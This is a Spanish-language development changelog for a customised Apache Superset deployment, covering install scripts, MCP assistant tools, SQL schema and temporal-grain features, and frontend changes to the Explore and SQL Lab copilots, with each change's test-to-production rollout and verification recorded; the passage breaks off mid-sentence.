## Registro de cambios

### 2026-10-09 (instalación completa en un servidor nuevo: script, overlay, plantilla de config y verificación)

Cambio realizado: validar que un Superset 6.1.0 limpio + `migrate-plugins.sh` reproduzca todo `superset_v6_1_0`. Prueba real: tag oficial `6.1.0` exportado a un temporal, script corrido, comparación archivo por archivo contra el árbol (AST para `.py`). Antes del cambio quedaban sin reproducir: exportación CSV/Excel de pivot Rx1, opciones de pivot Rx1 en dashboard/reportes/alertas, `description`/`default_value` de filtros en el MCP, tag `irex` de `list_charts`/`get_chart_info`, mejoras de la barra de filtros, el arreglo de filtros malformados en `models/helpers.py`, `head/tail_js_custom_extra.html`, `static/custom_spinner/`, la traducción es, `--experimental-global-webcrypto` del build y todo lo de entorno en `superset/config.py`. Hoy `tools/verify_clean_install.sh` termina en OK (60 rutas idénticas, solo diferencias aceptadas y explicadas).

Archivos afectados:
- `migrate-plugins.sh`: `patch_file` corregido (con `grep -qF` un patrón de varias líneas daba `[skip]` falso: por eso el paso 5 no aplicaba nada en 6.1.0); pasos 8b y 14 delegados al overlay; nuevos pasos 18 (reubicado, antes corría después del resumen), 19 overlay, 20 `custom_spinner`, 21 `package.json`, 22 compilación de `.mo`; contador de fallas y `exit 1` si alguno no se aplica.
- `custom-src/upstream-overlay/` (nuevo): `overlay.py` (build/apply/check), `FILES`, `manifest.json`, `files/` con 15 archivos, README. Solo copia sobre el original exacto de 6.1.0 (sha256); si encuentra otra cosa, falla.
- `custom-src/static/custom_spinner/` (nuevo).
- `config-templates/` (nuevo): `build_template.py` genera `superset_config.template.py` desde la config real de producción con secretos (`SUPERSET_DB_URI`, `GLOBAL_ASYNC_QUERIES_JWT_SECRET`, `MCP_JWT_SECRET`, `CHAT_BACKEND_SECRET`) y datos del servidor (URLs del widget/MCP, `EXTENSIONS_PATH`, URLs de webdriver y export) desde variables de entorno obligatorias, más `FAB_INDEX_VIEW`/`MCP_DEV_USERNAME`, que solo estaban en el `config.py` del núcleo. Falla si queda un secreto conocido. Verificado: con las variables tomadas de producción, las 357 variables de config dan lo mismo que la config de producción (solo cambian identidades de objetos). `superset.env.example`, README.
- `requirements-irex.txt` (nuevo): fastmcp, clickhouse-connect, lz4, pymssql, playwright, gevent, flower — instalados en el venv pero fuera de `requirements/base.txt`.
- `systemd-new/celery-async.service` (nuevo) y `systemd-new/deploy-services.sh` (lo incluye).
- `tools/verify_clean_install.sh`, `tools/compare_customized_tree.py` (nuevos), `PLUGINS.md` (sección de instalación completa).
- `INSTALACION_SERVIDOR_NUEVO.md` (nuevo): manual paso a paso para un servidor nuevo.
- `systemd-new/deploy-services.sh`: el MCP de test pasa a ser opcional (solo si existe `.env_superset_mcp_test`) y las unidades se habilitan para el arranque; `celery-async.service` toma `.env_superset` como `EnvironmentFile` (la plantilla de config lee los secretos del entorno).
- `config-templates/nginx-superset.conf.example` (nuevo).

Hallazgos que NO se cambiaron en este servidor:
- `celery-async.service` en producción corre desde el árbol viejo `superset_v6`, no desde `superset_v6_1_0`, y no estaba versionado. La versión de `systemd-new/` apunta a `superset_v6_1_0`; correr `deploy-services.sh` en este servidor la instalaría (cambio de producción a probar antes).
- Secretos commiteados: `superset_config_test.py`, `extensions/backups/superset_config.py.20260923-pre-fix-sync` y el `superset/config.py` de `superset_v6_1_0` (`SMTP_PASSWORD`, `GLOBAL_ASYNC_QUERIES_JWT_SECRET`) tienen valores reales, y ambos repos tienen remoto en GitHub.
- `superset_v6_1_0` no desciende del tag `6.1.0` (su historia arranca en un snapshot sobre 6.0.0rc4); su contenido sí es 6.1.0 + las personalizaciones.
- En el venv hay `celery-beat` 0.1.0, un paquete "guardián" de PyPI (nombre que se instala por error, el real es django-celery-beat): no se usa. `messages.mo` del español es de junio, más viejo que el `.po` de agosto: las traducciones del backend no están compiladas al día.
- No se probó `npm install`/`npm run build` sobre la copia limpia.

### 2026-10-09 (Explore: granularidades temporales reales del motor + `irex.resolve_temporal_expression` — solo test)

Cambio realizado: que el copiloto de Explore descubra cómo agrupar una columna temporal con las capacidades reales de Superset y del motor, sin funciones SQL fijadas por base.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/explore_temporal_core.py` (nuevo): `query_capabilities` y núcleo de resolución.
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/resolve_temporal_expression.py` (nuevo): tool `irex.resolve_temporal_expression`.
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/get_dataset_catalog.py`: sección aditiva `query_capabilities`.
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/entrypoint.py`: registro de la tool.
- `superset_config_test.py`: tool agregada a `always_visible` (respaldo previo en `/tmp/superset_config_test.backup-*.py`). Producción NO tocada.
- `custom-extensions/irex-mcp-tools/backend/tests/test_explore_temporal_core.py` (nuevo, 14 tests).
- `custom-extensions/irex-mcp-tools/docs/explore-assistant-contract.md` (esquemas) y `docs/explore-temporal-examples.json` (respuestas reales).

Qué hace:
- `query_capabilities`: base (id, nombre), motor, backend, dialecto sqlglot y `time_grains` [{id, label}] de `db_engine_spec.get_time_grains()` — sin URI ni credenciales. Falla aislada con `status`.
- `resolve_temporal_expression(form_data_key, column_name, time_grain)`: verifica la revisión con `verified_explore_state`, comprueba columna activa, `is_dttm` y granularidad admitida, y genera la expresión con `TableColumn.get_timestamp_expression` → `db_engine_spec.get_timestamp_expr`, compilada con el dialecto de la base. `status="generated"` + `resolution {generated: true, executed: false, validated: false}` + `next_step` hacia `irex.validate_expression`. No recibe SQL, no guarda ni ejecuta.

Verificación (test, en proceso con la config de test — metadata sqlite propia, bases reales):
- PostgreSQL "Cubo PSQL", dataset 10, columna física `fecha_id`: gráfico guardado (slice 75) y borrador (`slice_id=null`), P1D → `DATE_TRUNC('day', fecha_id)` y P1M → `DATE_TRUNC('month', fecha_id)`; las cuatro `validate_expression` `valid=true` contra datos reales.
- PostgreSQL, dataset 12, columna CALCULADA `Fecha` (`make_date(anio_id, mes_id, 1)`): P1M/P1D `valid=true`.
- ClickHouse, dataset 5, `fecha_id`: P1D → ``toStartOfDay(toDateTime(`fecha_id`))``, P1M → ``toStartOfMonth(...)``, ambas `valid=true`.
- Estados: `column_not_found`, `column_not_temporal`, `time_grain_not_supported` (ClickHouse no admite PT1S), `invalid_revision`, `permission_denied` (usuario Gamma `test`) — todos reales.
- Simulado (sin caso real en test): motor sin granularidades (`unsupported`), `NotImplementedError` de Superset, error de compilación y `query_capabilities` con error/permiso — solo con dobles en pruebas unitarias.
- Hallazgos: (1) en PostgreSQL `TimeGrain.duration` es un StrEnum; se normaliza a string. (2) La base "Bot Irex" (dataset 16) falla al conectar en test (`password authentication failed`) — no relacionado; por eso los casos PostgreSQL físicos se corrieron sobre "Cubo PSQL". (3) `irex.validate_expression` devuelve el mensaje crudo del driver en `error`, que puede incluir host y usuario de la base: preexistente, sin cambiar aquí.
- 425 tests backend, 425 frontend; `.supx` de `extensions_test/` reconstruido con `build-extension.sh`. Reiniciado `superset_mcp_test.service` (PID 3789331, 2026-10-09 07:37) y verificado por el MCP real de test (puerto 5009): la tool aparece en `tools/list`; `get_dataset_catalog` devuelve `query_capabilities` (ClickHouse, borrador); `resolve_temporal_expression` genera P1D/P1M en PostgreSQL (gráfico guardado) y P1M en ClickHouse (borrador), y las tres pasan `validate_expression`; `PT1S` en ClickHouse → `time_grain_not_supported`; usuario Gamma → `permission_denied`. Keys de prueba borradas.

**Promovido a producción (2026-10-09)** tras validación del usuario en test: se verificó que la fuente es idéntica a lo validado en `extensions_test/` y que las dependencias (`explore_state_core.py`, `sql_schema_structure.py`) ya estaban en producción; `zip -u` de `explore_temporal_core.py`, `resolve_temporal_expression.py` (nuevos), `get_dataset_catalog.py` y `entrypoint.py` sobre `extensions/irex-mcp-tools-0.1.0.supx` (copia fuente sincronizada) y `resolve_temporal_expression` agregado a `always_visible` en `/home/imercados/.superset/superset_config.py` (config verificada cargando el archivo; límites de respuesta intactos). Respaldos: `/tmp/irex-mcp-tools-prod-backup-202610091002-temporal.supx` y `/tmp/superset_config.prod.backup-202610091002-temporal.py`. Reiniciado `superset_mcp.service` (PID 3881412, 10:05:11) y verificado por el MCP real de producción (puerto 5008) con revisiones temporales (borradas al terminar): la tool aparece en `tools/list`; `query_capabilities` ok en PostgreSQL ("Cubo PSQL", 14 granularidades) y ClickHouse (11); P1D y P1M generadas para gráfico guardado y borrador en ambos motores — 8 de 8 pasan `validate_expression`. Incluye una columna física con espacios (`"FECHA ENVIO A CREDITO Y COBRO"`), que Superset citó correctamente.

### 2026-10-08 (SQL Lab: `irex.get_sql_schema_context` devuelve PK, FK, índices y definición/dependencias de vistas — en test)

Cambio realizado: pedido de ampliar la tool para que el asistente conozca la estructura sin ejecutar consultas a `pg_indexes` con EXPLAIN ANALYZE (que devuelve el plan, no los valores). Con `table`, además de columnas y `kind`, ahora devuelve (salvo `include_structure=false`) metadatos estructurados:
- `primary_key` (nombre, columnas), `foreign_keys` (columnas locales, tabla/columnas referidas, ON DELETE/UPDATE, `referred_accessible` según RBAC del usuario), `indexes` (nombre, unicidad, método, columnas CLAVE en orden con `column` o `expression` y ASC/DESC/NULLS FIRST, columnas INCLUDE, `predicate` de índices parciales, constraint asociada, validez).
- `view` (solo vistas/materializadas): `definition` SQL (tope 20.000 caracteres, con `definition_truncated`), `depends_on` (relaciones directas) y `base_tables` (tablas físicas finales resolviendo vistas anidadas, con `depth`).
- Cada sección trae `status` explícito (`ok` / `not_applicable` / `unsupported` / `permission_denied` / `error`) + `detail` + `source`: "no se pudo obtener" nunca equivale a "no existe" (una tabla sin PK da `ok` con `columns: []`). Una sección que falla no tumba las otras ni las columnas.
- PostgreSQL: índices, definición y dependencias salen de `pg_catalog` con consultas fijas y parámetros enlazados (la reflexión de SQLAlchemy 1.4 pierde las columnas-expresión). Otros motores: inspector genérico; dependencias de vistas por parseo de la definición con sqlglot (mejor-esfuerzo, marcado `parsed_definition`, sin `base_tables`).

Archivos afectados:
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/sql_schema_structure.py` (nuevo)
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/sql_schema_context.py`
- `custom-extensions/irex-mcp-tools/backend/tests/test_sql_schema_structure.py` (nuevo, 15 tests), `tests/test_sql_schema_context.py` (+3)

Hallazgos:
- **Bug de Superset**: `Database.get_pk_constraint` pasa cada valor por `json.base_json_conv`, que lanza TypeError con listas/strings y los deja en `None` — devuelve `{name: None, constrained_columns: None}` aunque la PK exista (visto en la base real). La tool lee la PK directo del inspector.
- Validado contra la base real (database 11, schema `appsheet`) corriendo la tool en un contexto de app: PK/FK con ON DELETE, índices parciales (`WHERE`) con `INCLUDE`, y `vi_plan_ruta_vista` — que SÍ existe como vista real — resuelta a 7 tablas físicas. No había índices sobre expresiones en ese schema, así que esa rama solo está cubierta por pruebas con filas simuladas del catálogo.
- Verificación: 411 tests backend, 425 frontend; `.supx` de `extensions_test/` reconstruido con `build-extension.sh`. Probado en test por el usuario. **Replicado a producción (2026-10-08)**: `zip -u` de `sql_schema_context.py` y `sql_schema_structure.py` (nuevo) sobre `extensions/irex-mcp-tools-0.1.0.supx` (respaldo previo `/tmp/irex-mcp-tools-prod-backup-202610081527-structure.supx`), copia fuente sincronizada; resto del contenido de `extensions_test/` NO trasladado. Reiniciado (PID 3239744, 15:28:56) y verificado con llamada real a producción: `eva_evaluacion_respuesta` (PK, 2 FK, índices desde `pg_catalog`) y `vi_plan_ruta_vista` (`kind=view`, PK/FK/índices `not_applicable`, definición y 7 tablas físicas base).

### 2026-10-08 (verificación en producción de los límites de respuesta por tool)

Tras el reinicio de `superset_mcp.service` (PID 3202093, 14:31:01) se hicieron llamadas reales a `explain_query` (EXPLAIN sin ANALYZE) por el MCP de producción con respuestas crecientes: una de 78.615 caracteres pasó (por encima del límite general de 25.000 tokens) y las siguientes se rechazaron con `Response too large: ~50,800 tokens (limit: 50,000)` — límite de 50.000 activo para estas tools; el general sigue en 25.000. Observación aparte: la primera llamada tras un rato inactivo falló con `server closed the connection unexpectedly` (conexión vieja del pool hacia Postgres) y la siguiente `get_sql_schema_context` falló con `Can't reconnect until invalid transaction is rolled back`; se recuperó sola en la llamada siguiente. Preexistente, no relacionado con este cambio.

### 2026-10-08 (MCP: límites de respuesta por tool trasladados a producción)

Cambio realizado: traslado a producción de "MCP response limits by tool" (aplicado en test el 2026-10-08). Revisión previa:
- Producción (`superset_mcp.service`, `.env_superset_mcp`) y test (`.env_superset_mcp_test`) cargan el MISMO árbol, `/home/imercados/superset_proyecto/superset_v6_1_0`; solo difieren en la config: producción `/home/imercados/.superset/superset_config.py`, test `superset_config_test.py`. Por eso el parche de `superset/mcp_service/middleware.py` ya estaba en el árbol (compartido) y no se volvió a aplicar: se verificó que el archivo es equivalente a la salida de `custom-src/MCPResponseSizeGuard/patch_response_size_guard.py` sobre el `middleware.py` de HEAD (solo difiere el formato de 2 comprensiones/llamadas; +31 líneas, nada más tocado en ese archivo). Mientras la config no defina `tool_token_limits` el parche es inerte.
- Pruebas: `tests/unit_tests/mcp_service/test_middleware.py` (20) + `custom-src/MCPResponseSizeGuard/test_response_size_guard.py` (3: concurrencia, proxy `call_tool` con rechazo por encima de 50.000, valores inválidos) = 23 passed. Ojo: las 3 pruebas canónicas FALLAN si se corren solas (`AttributeError: None does not have the attribute 'log'` — dependen del conftest de `tests/unit_tests/`, que inicializa `event_logger`); hay que correrlas junto con las del middleware.

Archivos afectados:
- `/home/imercados/.superset/superset_config.py` (producción, fuera del repo): bloque `MCP_RESPONSE_SIZE_CONFIG` con `tool_token_limits` = 50.000 para `extensions.irex.irex-mcp-tools.irex.{get_sql_schema_context,explain_query,check_query_nulls}`, insertado justo después de la config existente, que se preserva (verificado cargando el archivo: `token_limit` 25.000, `excluded_tools` intactos). Respaldo previo: `/tmp/superset_config.prod.backup-<fecha>.py`.
- Sin cambios en este traslado: `middleware.py` (ya parcheado), `.supx`, autenticación ni controles de lectura SQL.

Pendiente: reiniciar `superset_mcp.service` (requiere sudo) y verificar con una llamada real.

### 2026-10-07 (SQL Lab: `irex.get_sql_schema_context` ahora lista vistas, separadas de las tablas físicas)

Cambio realizado: el usuario preguntó (sesión `sqllab-0238c96522f4263f1709ed681d4601717c611ae95f69f9f9afd16b5c68565713`) si el MCP devuelve vistas o solo tablas físicas, por una vista `vi_plan_ruta_vista` que el asistente no encontró. Confirmado leyendo el código: el listado usaba solo `database.get_all_table_names_in_schema()` → `get_table_names()` ("The physical table names" en `db_engine_specs/base.py`); Superset tiene métodos hermanos para vistas (`get_all_view_names_in_schema`) y vistas materializadas que el tool nunca llamaba. En esa sesión la búsqueda exacta dio vacío y la amplia ("vi_plan") devolvió `vi_plan_ruta_vw`, `vi_plan_ruta_vw_old`, `vi_plan_ruta_vw_vista`, `vi_plan_visita_tb` (todas tablas físicas) — no se puede saber si `vi_plan_ruta_vista` existe como VISTA real hasta probar con este cambio.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/sql_schema_context.py`
- `custom-extensions/irex-mcp-tools/backend/tests/test_sql_schema_context.py` (+5 tests)

Qué cambia:
- Respuesta sin `table`: `tables` (físicas, igual que antes) + `views` + `materialized_views` nuevos, aditivos (no rompen al backend del chat, que solo lee `tables`). `search` aplica a las tres; el `limit` es POR categoría (una vista no queda fuera por haber muchas tablas). Listar vistas es mejor-esfuerzo: si el motor no las soporta o falla, el listado de tablas sigue igual.
- Respuesta con `table`: `table.kind` = `table` / `view` / `materialized_view` para que el modelo sepa qué es. La descripción de la tool aclara que una vista no es tabla física.
- Verificación: 393 tests backend en verde. Parche puntual a `extensions_test/` (zip -u desde `superset_v6_1_0/irex-mcp-tools`). Confirmado en test por el usuario (2026-10-08: "ya ve las vistas"). **Replicado a producción el mismo día**, solo este archivo: `zip -u` de `sql_schema_context.py` sobre `extensions/irex-mcp-tools-0.1.0.supx` (respaldo previo en `/tmp/irex-mcp-tools-prod-backup-202610080717.supx`), copia fuente sincronizada; el resto de lo que hay en `extensions_test/` (frontend de Explore/SQL Lab) NO se tocó en producción. Falta reiniciar `superset_mcp.service` (requiere sudo).

### 2026-10-05 (SQL Lab: el diff mostraba "se borra todo, se agrega 1 línea" cuando el modelo propone SQL sin saltos de línea)

Cambio realizado: usuario reportó sobre una sesión real (`sqllab-a14b0f7c3851308373d3402f0d646432167dd16f2220677cdbb2eb6bc3d5acca`)
que una propuesta de `replace_document` se mostró como "1 línea" — revisando
el log, el modelo efectivamente propuso una consulta de 6500+ caracteres
(14 CTEs, varios JOIN, un ARRAY JOIN) toda en una sola línea, sin ningún
salto. `SqlDiff.tsx` (SQL Lab) diffa línea por línea sobre el texto crudo
(`before.split('\n')` vs `after.split('\n')`) sin formatear nada antes —
con `after` de una sola línea, el diff entero se ve como "se borra todo el
`before`, se agrega 1 línea gigante": inútil para revisar el cambio real.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/codeFormat.ts` (+`formatSql`, +`looksUnformattedSql`)
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/SqlDiff.tsx`
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/codeFormat.test.ts` (+9 tests)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/SqlDiff.test.tsx` (nuevo, 4 tests)

Qué cambia o corrige:
- Nuevo `formatSql`, mismo espíritu que `formatCss`/`formatHtml` ya
  existentes para Explore (best-effort para LECTURA humana en el diff,
  nunca un parser SQL formal, nunca decide validez ni transforma lo que de
  verdad se aplica). Reconoce los mismos tramos atómicos que
  `tokenizeSql` (strings con `''` escapado, `"..."`/`` `...` `` , `--`,
  `/* */`, `{{ }}`/`{% %}`/`{# #}`, `$tag$...$tag$`) para nunca
  reestructurar su contenido, y agrega saltos de línea + indentación por
  profundidad de paréntesis en dos puntos: antes de cada palabra clave de
  cláusula (SELECT/FROM/WHERE/GROUP BY/JOIN/ON/etc., sin importar la
  profundidad) y después de una coma que separa ítems de la cláusula
  ACTUAL (misma profundidad en la que se vio la última palabra clave) —
  una coma dentro de una llamada a función (`coalesce(a,b)`) o de un
  array literal (`ARRAY JOIN [a,b,c]`) queda pegada, no se confunde con un
  separador de la cláusula.
- `SqlDiff` normaliza `before`/`after` con `formatSql` SOLO cuando `after`
  viene sin saltos de línea reales (`looksUnformattedSql`, umbral de 80
  caracteres para no reformatear un `SELECT 1` corto) — si `after` ya
  viene formateado, ninguno de los dos lados se toca, cero riesgo de
  reformatear (con OTRO estilo) un SQL que ya se mostraba bien. Normaliza
  los DOS lados con el MISMO formateador (no solo `after`) para que el
  diff refleje cambios reales, no una diferencia de estilo entre el
  `before` (ya bien formateado, viene del editor) y un `after` recién
  reformateado.
- **Dos bugs reales encontrados probando contra el SQL real de la
  sesión** (antes de escribir los tests formales): (1) `[`/`]` no se
  trackeaban como profundidad de paréntesis — una coma dentro de un array
  literal (`ARRAY JOIN [a,b,c,d] AS x`) se confundía con una coma de la
  cláusula y cortaba adentro del array; (2) un `replace(/[ \t]+$/, '')`
  de más, justo antes de escribir una palabra clave de cláusula, se comía
  la indentación que un salto de línea anterior ya había puesto, dejando
  "SELECT" pegado al margen en vez de indentado dentro de su subconsulta.
- Verificación: `tsc --noEmit` limpio, 425 tests frontend (29 suites, 13
  nuevos) en verde — incluye un test con el SQL REAL de 6541 caracteres
  extraído de la sesión reportada (confirmado legible: 14 CTEs cada uno en
  su propio bloque, cada cláusula en su propia línea). `.supx`
  reconstruido con `build-extension.sh` y copiado a `extensions_test/`.
  Falta: reiniciar `superset_test.service`/`superset_mcp_test.service` y
  probar en vivo.

### 2026-10-05 (corrección sobre la entrada anterior: el aviso inline no alcanzaba — ahora es un popup real)

Cambio realizado: el usuario aclaró el pedido anterior ("Solo el mensaje de confirmación no me gusta demasiado, que sea del tipo mensaje emergente... en la interfaz del chat") — "Me refería más a un mensaje emergente pero de la misma interfaz de Superset". El aviso inline (`ConfirmNotice` empujando contenido dentro del flujo de la tarjeta/panel) no era lo que pedía: quería un popup real, visualmente consistente con Superset.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/ExploreAssistantPanel.tsx`
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/ExploreAssistantPanel.test.tsx`

Qué cambia o corrige:
- `ConfirmNotice` pasó de tarjeta inline a overlay real: `position: fixed; inset: 0` con fondo (`theme.colorBgMask`) + tarjeta centrada con sombra (`theme.colorBgElevated`/`theme.boxShadowSecondary`/`theme.borderRadiusLG`) — los MISMOS tokens de tema que usa un Modal real de antd/Superset (confirmados en `node_modules/@apache-superset/core/lib/theme/types.d.ts::allowedAntdTokens`), aunque no es el componente `Modal` en sí: `@apache-superset/core` (la única API pública de extensión disponible) solo expone `Alert` en `components`, no `Modal`/`Popconfirm`; sumar `@superset-ui/core` entero como dependencia nueva solo para esto infla el bundle sin necesidad.
- `position: fixed` (no `absolute`): el aviso de "Aplicar" vive varios niveles adentro del área de conversación con `overflow: auto` — con `absolute` el popup habría quedado recortado/scrolleable dentro de esa caja chica en vez de cubrir toda la pantalla; `fixed` escapa de cualquier `overflow` de los ancestros sin necesitar un portal de React.
- Semántica real de popup: click en el fondo (fuera de la tarjeta) cancela, `Escape` cancela — igual que cualquier modal.
- Verificación: `tsc --noEmit` limpio, 408 tests frontend (28 suites, 2 nuevos: click en el fondo cancela, Escape cancela), `.supx` reconstruido con `build-extension.sh` y copiado a `extensions_test/`. Falta: reiniciar `superset_test.service`/`superset_mcp_test.service` y probar en vivo.

### 2026-10-05 (copiloto Explore: los dos `window.confirm` pasan a ser avisos dentro del panel)

Cambio realizado: feedback del usuario sobre las dos confirmaciones agregadas hoy mismo (advertencia de "Generar" con propuesta sin aplicar, y la confirmación de "Aplicar" que ya existía desde Fase 6) — "Solo el mensaje de confirmación no me gusta demasiado, que sea del tipo mensaje emergente del navegador. Es posible hacerlos en la interfaz del chat?". Las dos usaban `window.confirm` (diálogo nativo, bloqueante, sin estilo).

Archivos afectados:
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/ExploreAssistantPanel.tsx`
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/ExploreAssistantPanel.test.tsx`

Qué cambia o corrige:
- Nuevo `ConfirmNotice` (mensaje + "Cancelar"/confirmar, estilo de aviso ya usado por el resto del panel) reemplaza los dos `window.confirm`:
  - **"Aplicar"**: `usePreparedApply` separa en `handleApplyClick` (solo muestra el aviso) y `handleConfirmApply` (el POST real, antes vivía adentro del `if (window.confirm(...))`). `handleCancelConfirm` descarta solo el aviso — el diff preparado se mantiene, se puede volver a tocar "Aplicar". Mismo texto que tenía el diálogo nativo.
  - **Advertencia de "Generar" con propuesta sin aplicar**: como `handleSend` es async y se llama desde varios lugares esperando que se resuelva solo cuando el usuario decide (visual review, adjuntar imagen, comandos), `window.confirm` (síncrono) se reemplazó por `confirmGenerateReplace()`, que devuelve una `Promise<boolean>` que queda pendiente hasta que el usuario responde el aviso — mismo contrato de `await` que tenía el diálogo nativo, ningún llamador de `handleSend` necesitó cambios. Mientras el aviso está en pantalla, "Generar" queda deshabilitado (vía `sendDisabledReason`, sin tocar el texto del botón).
- **Hallazgo lateral durante las pruebas**: el primer test nuevo de "Aplicar" dejó la URL en `slice_id=7` sin restaurarla al terminar (solo limpiaba `localStorage`) — eso le pegó ese `slice_id` residual a varios tests intermedios que no fijan su propia ubicación, y terminó rompiendo un test de un describe totalmente distinto, 300 líneas más abajo, que esperaba exactamente 1 entrada guardada. Mismo patrón ya documentado antes en este proyecto (`window.location` persiste entre tests del mismo archivo) — fix: el `afterEach` nuevo restaura la URL además de limpiar `localStorage`.
- Verificación: `tsc --noEmit` limpio, 406 tests frontend (28 suites, 6 nuevos: 3 de "Aplicar" con mock de `fetch` real GET+POST, 4 reescritos de la advertencia de "Generar" sin mockear `window.confirm`), `.supx` reconstruido con `build-extension.sh` y copiado a `extensions_test/`. Falta: reiniciar `superset_test.service`/`superset_mcp_test.service` y probar en vivo.

### 2026-10-05 (hallazgo real en primera prueba de "adjuntar imagen de referencia": el modelo no llamó a la tool)

Cambio realizado: primera prueba real del usuario de la función de
adjuntar imagen (entrada de hoy, más abajo) — adjuntó una imagen con
Ctrl+V (confirmó verla en el chip de preview, esa parte funcionó) y pidió
"unir" el gráfico actual (slice 53, html_cards) con el gráfico 54.
Revisando la sesión (`explore-23054a815ef38f3245ab39091a519d069fe5d853deb77ddcf7c02475a76999d7`,
test, puerto 5009): el único `tool_call` del turno fue `get_chart_info(54)`
— **nunca llamó a `irex.get_chart_screenshot`** — y su respuesta final
incluyó esta frase: "No puedo inspeccionar la imagen con capture_id en
esta sesión, así que no atribuiré características visuales a esa
referencia." La tool está disponible y correctamente excluida del guard
de tamaño en `superset_config_test.py` (confirmado por grep, sin cambios
necesarios ahí) — el modelo decidió no intentarlo, no es que no pudiera.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/get_chart_screenshot.py`

Qué cambia o corrige:
- Reforzada la descripción de la tool con una instrucción imperativa al
  principio: si el mensaje menciona un `capture_id` DE CUALQUIER FORMA
  (no solo con las frases exactas de los ejemplos), SIEMPRE llamarla antes
  de responder — nunca asumir sin haber llamado que la imagen "no se
  puede inspeccionar en esta sesión". El manejo de `not_found` (vencido/
  inexistente/de otro usuario) se deja condicionado a DESPUÉS de haber
  intentado la llamada, no como excusa para no intentarla.
- **Esto es un refuerzo del lado del MCP, no una solución confirmada** —
  sigue sin estar claro POR QUÉ el modelo se negó esta vez cuando la MISMA
  tool, con el mismo capture_id en texto plano, ya funcionó de punta a
  punta para el flujo de "Revisión visual solicitada" (confirmado
  2026-09-30). Reportado al otro agente (backend del chat) para que
  revise si hay alguna diferencia de prompt/instrucciones entre modos, o
  alguna lógica que distinga el mensaje nuevo ("Imagen de referencia
  adjunta...") del mensaje ya probado ("Revisión visual solicitada...").
- Verificación: 388 tests backend sin cambios (es solo texto de
  descripción), parche puntual aplicado a `extensions_test/irex-mcp-tools-0.1.0.supx`
  con el flujo manual de un solo archivo (zip -u desde el directorio
  correcto, path verificado).
- **CONFIRMADO tras reiniciar `superset_mcp_test.service`** (sesión
  `explore-a083eb811e7777c6c9bc6f700d8edeff3bc24b70993005a97f4ab9b7697ecc91`,
  mismo gráfico, misma imagen pegada): el refuerzo de la descripción
  alcanzó — esta vez `irex.get_chart_screenshot` fue el PRIMER `tool_call`
  del turno, el modelo recibió la imagen, y propuso una tarjeta nueva
  (`handlebarsTemplate`/`styleTemplate`/`metrics`/`column_config`)
  siguiendo fielmente el diseño de la referencia (anillo de progreso +
  comparación visual), reusando la métrica guardada del gráfico 54.
  `agent_done`/`done.explore_response` coinciden. No hizo falta ningún
  cambio del lado del backend del chat — era, efectivamente, un problema
  de que el modelo no sabía que DEBÍA intentar la llamada ante un mensaje
  con un prefijo que no había visto antes ("Imagen de referencia
  adjunta..." vs. "Revisión visual solicitada...").

### 2026-10-05 (copiloto Explore: advertencia de propuesta sin aplicar + adjuntar imagen de referencia)

Cambio realizado: dos pedidos del usuario sobre el copiloto de Explore ya
en producción. (1) Tocar "Generar" (con o sin texto) mientras hay una
propuesta aplicable sin aplicar en pantalla reemplazaba el diff armado sin
ningún aviso. (2) Pedido de poder adjuntar una imagen (botón o Ctrl+V,
"por ejemplo subir un gráfico de ejemplo y pedirle que lo copie igual")
para que el modelo la revise y proponga cambios.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/ExploreAssistantPanel.tsx`
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/ExploreConversation.tsx`
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/icons.tsx` (+ícono `image`)
- `custom-extensions/irex-mcp-tools/frontend/src/adapters/chartScreenshotAdapter.ts` (+`convertImageToJpeg`)
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/get_chart_screenshot.py` (solo descripción de la tool)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/chartScreenshotAdapter.test.ts` (+4 tests)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/ExploreAssistantPanel.test.tsx` (+9 tests)

Qué cambia o corrige:
- **Advertencia de propuesta sin aplicar**: `handleSend` ahora chequea, antes
  de armar el pedido nuevo, si `response.actions` tiene alguna acción
  APLICABLE (`isApplicableExploreAction`) — si la hay, pide confirmación con
  `window.confirm` (mismo patrón ya usado por `usePreparedApply`) antes de
  seguir. Acciones no aplicables desde el panel (`add_dataset_metric`,
  `preview`) nunca tuvieron nada que "perder", así que no preguntan.
- **Adjuntar imagen de referencia**: reusa el pipeline de subida que ya
  existía para la revisión visual del propio gráfico
  (`chart_screenshot_api.py`/`irex.get_chart_screenshot`, sin tocar su
  lógica) — confirmado que el endpoint no valida el CONTENIDO de la
  imagen contra el gráfico actual, solo que el dataset declarado sea
  accesible al usuario, así que una imagen subida por el usuario entra
  sin cambios de backend. `convertImageToJpeg` (nuevo, en
  `chartScreenshotAdapter.ts`) convierte cualquier formato (PNG, lo que
  venga del portapapeles) a JPEG vía `createImageBitmap` + `<canvas>`
  (fondo blanco para transparencia — JPEG no tiene canal alfa),
  reescalando al mismo `MAX_CAPTURE_WIDTH` que la captura del propio
  gráfico. `ExploreConversation` ganó un botón de adjuntar + manejo de
  `onPaste` sobre el textarea (clipboard con un item `image/*`) + un chip
  de preview con nombre y botón de quitar. El wrapper `handleGenerateClick`
  en el panel sube la imagen (si hay una adjunta) ANTES de llamar a
  `handleSend`, componiendo el mensaje con el `capture_id` — mismo orden
  estricto que `handleVisualReview`. Se actualizó la descripción de
  `irex.get_chart_screenshot` para que el modelo distinga los dos casos de
